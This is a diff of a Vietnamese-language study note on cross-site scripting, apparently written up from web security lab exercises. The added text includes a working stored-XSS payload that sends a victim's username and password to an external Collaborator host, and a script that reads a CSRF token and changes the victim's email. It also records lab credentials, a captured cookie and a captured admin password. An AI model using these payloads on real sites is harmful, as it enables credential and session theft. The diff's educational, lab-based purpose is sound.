@@ -1,4 +1,4 @@
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c90822f2-bc18-4341-8596-ea9aa4267f20" />Tìm hiểu Cross-site scripting (XSS)
+ Tìm hiểu Cross-site scripting (XSS)
 A.	LÝ THUYẾT
 1.	Khái niệm và mục đích:
 -	Khái niệm: Cross-site scripting (XSS) là lỗ hổng bảo mật web cho phép kẻ tấn công chèn và thực thi mã độc (thường là JavaScript) vào trình duyệt của người dùng thông qua một ứng dụng web dễ bị tấn công.
@@ -337,8 +337,59 @@ Bước 3: Quay lại Collaborator. Ghi lại giá trị cookie của nạn nhâ
 giá trị cookie: 3XsEYKip1OGABghv3wdMZRm1y0fT5a0H
 Bước 4: Tải lại trang blog chính, sử dụng Burp Repeater để thay thế cookie phiên của ta bằng cookie ta đã ghi lại trong Burp Collaborator. 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13dda52b-e65f-4e72-9382-55d6d703bd34" />
-
-
+Ta cũng có thể dùng cùng một cookie trong yêu cầu /my-account để tải trang tài khoản của người dùng quản trị
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3f18300c-287a-411b-a609-913de28201f4" />
+4.2 Khai thác tấn công cross-site scripting để lấy mật khẩu
+Bước 1: Nhập bình luận sao vào hộp blog:
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://fatzamv925uan7e7t09wheib329t8hy5n.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+Tập lệnh này sẽ gửi yêu cầu POST có chứa tên người dùng và mật khẩu tới tên miền phụ của máy chủ Collaborator công khai cho bất kỳ ai xem bình luận.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/48819c2f-e971-4772-bc75-1933126fdb7e" />
+Ta có được tên người dùng là: administrator
+Mật khẩu là : 0kmwb3gtjxe1q5z8uc2c
+Bước 2: Sử dụng thông tin để đăng nhập
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/510a036d-28b4-4f59-8389-172ce9c7a49b" />
+4.3 Khai thác tấn công cross-site scripting để vượt qua các biện pháp bảo vệ CSRF
+Bài lab này khai thác lỗ hổng này để đánh cắp mã thông báo CSRF, sau đó ta có thể sử dụng mã thông báo này để thay đổi địa chỉ email của người xem bình luận trên bài đăng trên blog
+- Thông tin đăng nhập: wiener:peter
+Bước 1: Sử dụng thông tin đăng nhập wiener:peter. 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dccd5f97-41b5-4913-96fc-3042013e3663" />
+- Khi gửi yêu cầu POST tới /my-account/change-email, với tham số có tên là email.
+- Có một mã thông báo chống CSRF trong đầu vào ẩn có tên là token.
+Bước 2: Dán nội dung sao vào blog.Điều này sẽ khiến bất kỳ ai xem bình luận gửi yêu cầu POST để thay đổi địa chỉ email của họ thành test@test.com.
+          <script>
+          var req = new XMLHttpRequest();
+          req.onload = handleResponse;
+          req.open('get','/my-account',true);
+          req.send();
+          function handleResponse() {
+              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+              var changeReq = new XMLHttpRequest();
+              changeReq.open('post', '/my-account/change-email', true);
+              changeReq.send('csrf='+token+'&email=test@test.com')
+          };
+          </script>     
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e1cb7bd2-aab6-4978-823d-10f16bb6dda3" />
+- Trang đổi email có CSRF token, bình thường sẽ chặn tấn công CSRF.
+- Nhưng trang blog bị Stored XSS, attacker chèn JavaScript độc hại vào bình luận.
+- Khi nạn nhân xem bình luận, script chạy trong trình duyệt của họ:
+      + Gửi request GET tới /my-account để lấy CSRF token hợp lệ.
+      + Dùng token đó để gửi POST tới /my-account/change-email kèm email giả.
+- Do request được gửi bằng session của nạn nhân → hệ thống tin là hợp lệ → email của nạn nhân bị đổi.
+5.Chính sách bảo mật nội dung
+CSP là một cơ chế bảo mật trình duyệt nhằm mục đích giảm thiểu XSS và một số cuộc tấn công khác. Nó hoạt động bằng cách hạn chế các tài nguyên (như tập lệnh và hình ảnh) mà một trang có thể tải và hạn chế việc một trang có thể được đóng khung bởi các trang khác hay không.
+Để bật CSP, phản hồi cần bao gồm tiêu đề phản hồi HTTP được gọi Content-Security-Policyvới giá trị chứa chính sách. Bản thân chính sách bao gồm một hoặc nhiều chỉ thị, được phân tách bằng dấu chấm phẩy
+5.1 Giảm thiểu các cuộc tấn công XSS bằng CSP
+- Trước tiên hãy thực hiện một cuộc tấn công mã lệnh chéo trang web (cross-site scripting) bỏ qua CSP và đánh cắp mã thông báo CSRF của người dùng nạn nhân được mô phỏng bằng Burp Collaborator. Sau đó, bạn cần thay đổi địa chỉ email của người dùng được mô phỏng thành hacker@evil-user.net.
+- Bạn phải gắn nhãn vector của mình bằng từ "Click" để khuyến khích người dùng mô phỏng nhấp vào nó. Ví dụ: <a href="">Click me</a>
+- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:wiener:peter
+Bước 1: Đăng nhập bằng tài khoản được cung cấp. Quan sát thấy có lỗ hổng XSS trong tham số email
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7208c024-0cbc-4cbe-8cdc-24a6541a06ea" />
+Bước 2: Vào máy chủ khai thác và nhập đoạn code sau: 
 
 
 
